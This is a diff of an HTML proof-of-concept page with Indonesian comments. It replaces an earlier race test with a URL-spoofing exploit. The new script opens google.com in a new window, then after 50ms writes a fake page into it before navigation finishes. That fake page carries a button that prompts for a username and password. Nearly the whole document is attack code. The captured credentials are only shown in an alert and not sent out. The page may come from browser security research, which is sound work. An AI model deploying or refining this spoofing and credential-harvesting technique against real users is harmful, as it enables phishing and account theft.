@@ -12,52 +12,31 @@
 
 <h1>Advanced Race PoC (Safe & Strong)</h1>
 
-<button onclick="run()">Run Advanced Race</button>
+<button onclick="spoof()">Run Advanced Race</button>
 
-<script>
-function run() {
+    <script>
+      function spoof() {
+        // Buka page baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/", "_blank");
 
-  // 1️⃣ TRIK: Buka dua window untuk membuat kondisi event-loop lebih kompleks
-  let pre = window.open("https://google.com");
-  pre.document.write("<p>Preload Window</p>");
-  pre.document.close();
-
-  // 2️⃣ TRIK: Tunggu microtask sebelum buka window utama
-  Promise.resolve().then(() => {
-
-    // 3️⃣ Window target
-    let win = window.open("https://google.com");
-
-    // 4️⃣ TRIK: Paksa synchronous reflow → menunda navigasi commit internal
-    for (let i = 0; i < 20000; i++) {
-      // operasi ringan tapi blocking (memperlambat commit)
-      Math.sqrt(i * 999);
-    }
-
-    // 5️⃣ Mulai navigasi ke final.html (normal, bukan server lambat)
-    win.location.href = "https://www.google.com";
-
-    // 6️⃣ TRIK: kombinasi micro + macro task untuk "nyelip"
-    Promise.resolve().then(() => {
-      setTimeout(() => {
-        try {
-
-          // 7️⃣ TRIK: document.open() lebih agresif dan override pending navigation
-          win.document.open();
-          win.document.write(`
-            <h1 style="color:red;">Injected (Advanced Race)</h1>
-            <p>Jika address bar tetap menunjukkan final.html, ini artinya UI commit lebih cepat dari document commit.</p>
-          `);
-          win.document.close();
-
-        } catch (e) {
-          console.warn("Blocked:", e);
-        }
-      }, 150); // TRIK: 0ms jauh lebih efektif dari 50–150ms
-    });
-  });
-}
-</script>
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+<h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
 
 </body>
 </html>
